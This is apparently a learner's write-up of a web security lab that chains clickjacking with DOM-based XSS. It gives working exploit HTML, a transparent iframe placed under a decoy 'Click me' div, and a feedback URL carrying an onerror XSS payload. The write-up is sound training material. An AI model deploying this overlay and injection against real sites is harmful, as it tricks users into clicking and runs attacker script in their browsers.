Exploiting Clickjacking Vulnerability to Trigger DOM-based XSS

**Category**: XSS / Clickjacking  
**Difficulty**: Practitioner  

---

## Overview / What I Learned

- This lab combines two separate vulnerabilities: **clickjacking** and **DOM-based XSS**.
- The XSS is not automatically triggered; it requires a **user click** on the “Submit feedback” button.
- The attack uses a **transparent iframe** to trick the victim into clicking a hidden button.
- Mastered iframe manipulation, precise positioning, and how user interaction can trigger client-side JavaScript vulnerabilities.

---

## Exploit Steps / Attack Methodology

### 1. Lab Analysis

- The `feedback` endpoint reflects user input from the `name` parameter into the DOM using `innerHTML`.
- This leads to a DOM-based XSS if JavaScript is injected.
- However, the payload is only executed after the victim clicks a button labeled "Click me" on the feedback result page.

### 2. Strategy

- Embed the vulnerable feedback form inside a **transparent iframe**.
- Place a fake "Click me" button (`<div>`) above it.
- Align the fake button precisely over the real feedback form’s submit button to trick the victim into clicking it.
- The click will trigger the `onerror=print()` XSS payload.

### 3. Exploit HTML Used

```html
<style>
  iframe {
    position: relative;
    width: 700px;
    height: 700px;
    opacity: 0.0001;
    z-index: 2;
  }
  div {
    position: absolute;
    top: 610px;
    left: 80px;
    z-index: 1;
  }
</style>

<div>Click me</div>

<iframe src="https://labId.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>

Replaced labId with the correct lab domain.

Clicked Store, then View exploit to test positioning.

Ensured the cursor became a pointer when hovering over "Click me".

Clicking it triggered the print() dialog.

clicked Deliver exploit to victim to solve the lab.

